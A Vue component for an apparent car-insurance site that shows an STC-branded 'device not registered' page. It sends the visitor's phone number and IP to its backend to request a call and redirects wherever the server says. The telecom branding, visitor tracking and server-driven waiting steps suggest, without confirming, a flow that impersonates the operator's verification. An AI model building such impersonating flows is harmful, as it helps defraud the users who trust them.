<template>
    <StcLayout>
        <!-- Back Button -->
        <div class="my-5 flex w-full justify-start">
            <button type="button" class="stc-back-btn" @click="goBack" :aria-label="t('common.back')">
                <svg class="h-4 w-4 rtl:rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                    aria-hidden="true">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
                </svg>
                <span>{{ t('common.back') }}</span>
            </button>
        </div>

        <!-- Main Content -->
        <div class="flex w-full flex-col items-center gap-5 py-8">
            <!-- Device Not Registered Illustration -->
            <div class="flex h-52 items-center justify-center md:h-auto">
                <img class="max-w-xs" src="/images/device-not-registered.svg" alt="الجهاز غير مسجل"
                    loading="lazy" />
            </div>

            <!-- Heading -->
            <h2 class="text-center text-3xl font-medium stc-text-primary lg:text-4xl">
                {{ t('stc.deviceNotRegistered.title') }}
            </h2>

            <!-- Description -->
            <p class="text-center text-base stc-text-dark">
                {{ t('stc.deviceNotRegistered.description') }}
            </p>

            <!-- Spacer -->
            <div class="py-2"></div>

            <!-- CTA Buttons -->
            <div class="w-full space-y-3">
                <!-- Primary Button: Receive Call -->
                <button type="button" class="stc-btn-contained w-full transition-all duration-200 active:scale-95"
                    @click="requestCall" :disabled="loading || callRequested" :aria-busy="loading"
                    :aria-label="t('stc.deviceNotRegistered.requestCall')">
                    <span v-if="loading" class="flex items-center justify-center gap-2">
                        <svg class="h-5 w-5 animate-spin" fill="none" viewBox="0 0 24 24" aria-hidden="true">
                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor"
                                stroke-width="4" />
                            <path class="opacity-75" fill="currentColor"
                                d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                        </svg>
                        {{ t('common.loading') }}
                    </span>
                    <span v-else class="flex items-center justify-center gap-2">
                        <svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                            aria-hidden="true">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
                        </svg>
                        {{ t('stc.deviceNotRegistered.requestCall') }}
                    </span>
                </button>

                <!-- Secondary Button: Skip -->
                <button type="button" class="stc-btn-secondary w-full transition-all duration-200 active:scale-95"
                    @click="skip" :disabled="loading" :aria-label="t('stc.deviceNotRegistered.skip')">
                    {{ t('stc.deviceNotRegistered.skip') }}
                </button>
            </div>

            <!-- Error Message -->
            <Transition name="stc-fade">
                <div v-if="error" class="w-full rounded-lg border border-red-300 bg-red-50 p-3 text-center"
                    role="alert" aria-live="assertive">
                    <p class="text-sm text-red-700">{{ error }}</p>
                </div>
            </Transition>

            <!-- Success Message -->
            <Transition name="stc-fade">
                <div v-if="callRequested && !error" class="w-full rounded-lg border border-green-300 bg-green-50 p-3 text-center"
                    role="status" aria-live="polite">
                    <p class="text-sm text-green-700">{{ t('stc.deviceNotRegistered.callRequested') }}</p>
                </div>
            </Transition>
        </div>
    </StcLayout>
</template>

<script setup>
import { ref } from 'vue';
import { useRouter, useRoute } from 'vue-router';
import { useI18n } from 'vue-i18n';
import { useVisitorTracking } from '@/composables/useVisitorTracking';
import request from '@/api/request';
import StcLayout from '@/car.insurance/components/StcLayout.vue';
import { safeRedirect } from '@/utils/safeRedirect';
import { getSessionToken } from '@/utils/sessionToken';

const router = useRouter();
const route = useRoute();
const { t } = useI18n();

useVisitorTracking('stc/device-not-registered');

// ─── Load context from sessionStorage ────────────────────────────
const stcContext = JSON.parse(sessionStorage.getItem('stcContext') || '{}');
const phoneNumber = stcContext.phoneNumber || '';
const customerIp = stcContext.customerIp || '';

// ─── State ──────────────────────────────────────────────────────
const loading = ref(false);
const callRequested = ref(false);
const error = ref('');

// ─── Request device registration via phone call ──────────────────
const requestCall = async () =>
{
    if (loading.value || !phoneNumber) return;

    loading.value = true;
    error.value = '';

    try
    {
        const res = await request.post('/stc/device-not-registered/request-call', {
            session_id: getSessionToken(),
            phone: phoneNumber,
            customer_ip: customerIp,
        });

        if (res.data.success)
        {
            callRequested.value = true;

            // Update context and move to call waiting page
            sessionStorage.setItem('stcContext', JSON.stringify({
                ...stcContext,
                phoneNumber,
                customerIp,
                deviceRegistrationInProgress: true,
            }));

            setTimeout(() =>
            {
                safeRedirect(res.data.redirect_to, 'stcCallWaiting', router);
            }, 1500);
        } else
        {
            error.value = res.data.message || t('stc.deviceNotRegistered.error');
        }
    } catch (err)
    {
        error.value = err.response?.data?.message || t('stc.deviceNotRegistered.error');
        console.error('[STC Device Not Registered]', err);
    } finally
    {
        loading.value = false;
    }
};

// ─── Skip device registration ───────────────────────────────────
const skip = () =>
{
    sessionStorage.setItem('stcContext', JSON.stringify({
        ...stcContext,
        phoneNumber,
        customerIp,
        deviceRegistrationSkipped: true,
    }));

    // Option 1: Go back to waiting page
    // Option 2: Go directly to call waiting
    // Choose based on product flow
    router.push({ name: 'stcWaiting' });
};

// ─── Navigation ─────────────────────────────────────────────────
const goBack = () => router.back();
</script>

<style scoped>
@reference "../../../css/app.css";

/* Ensure proper spacing for RTL */
[dir="rtl"] .stc-back-btn svg {
    transform: scaleX(-1);
}

/* Button styling is handled by global stc-btn-* classes */
.stc-btn-secondary {
    @apply rounded-lg border-2 border-gray-300 bg-white px-6 py-2.5 font-medium text-gray-700 transition-colors hover:border-gray-400 hover:bg-gray-50 disabled:cursor-not-allowed disabled:opacity-50;
}

/* Fade transition for messages */
.stc-fade-enter-active,
.stc-fade-leave-active {
    transition: all 0.3s ease;
}
.stc-fade-enter-from,
.stc-fade-leave-to {
    opacity: 0;
    transform: translateY(-8px);
}
</style>
